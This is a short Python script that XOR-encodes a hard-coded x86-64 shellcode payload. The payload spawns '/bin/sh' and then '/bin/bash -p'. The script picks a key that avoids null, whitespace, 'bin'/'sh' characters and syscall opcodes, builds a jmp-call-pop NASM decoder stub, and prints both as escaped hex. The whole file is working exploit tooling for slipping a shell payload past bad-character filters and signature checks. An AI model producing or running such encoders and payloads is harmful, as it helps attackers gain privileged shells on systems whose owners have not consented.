#!/usr/bin/python3
import	sys
import	os
import	subprocess
from binascii import	unhexlify
from termcolor import	colored
from subprocess import	Popen, PIPE

filters = [0x00, 0x08, 0x09, 0x0a, 0x0d, 0x20, 0x2f, 0x62, 0x69, 0x6e, 0x73, 0x68, 0x80cd, 0x050f, 0x340f]

shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05, 0x0a, 0x2f,0x62,0x69,0x6e,0x2f,0x62,0x61,0x73,0x68, 0x00, 0x2d, 0x70, 0x00, 0x00]

filename = sys.argv[1]
shellcode_len = len(shellcode)

def	get_offset(shellcode, offset = 5):
	for s in shellcode:
		x = s ^ offset
		for c in filters:
			if x == c or x >= 255:
				return get_offset(shellcode, offset + 1)
	return offset

def	print_encoded(shellcode, offset):
	print(''.join([r'\x{:02x}'.format((c ^ offset)) for c in shellcode]))

def	print_decoder(shellcode, offset):
	f = open("decoder.asm", "w")
	f.write("""BITS 64
jmp short foo
bar:
	pop rsi
	xor rcx, rcx
	mov cl, {0}
decoder:
	xor byte [rsi + rcx - 1], {1}
	loop decoder
	mov byte [rsi], {1}
	push rsi
	ret
foo:
	call bar
	""".format(hex(shellcode_len), hex(offset)))
	f.close()
	os.system("nasm decoder.asm")
	result = subprocess.Popen(['xxd -ps decoder'], shell=True, stdout=subprocess.PIPE).communicate()[0]
	result = result.decode("utf-8").replace("\n", "")
	sys.stdout.write(r"\x" + r"\x".join(result[n : n+2] for n in range(0, len(result), 2)))

offset = get_offset(shellcode)
print("Offset {}".format(offset))
print_decoder(shellcode, offset)
print_encoded(shellcode, offset)
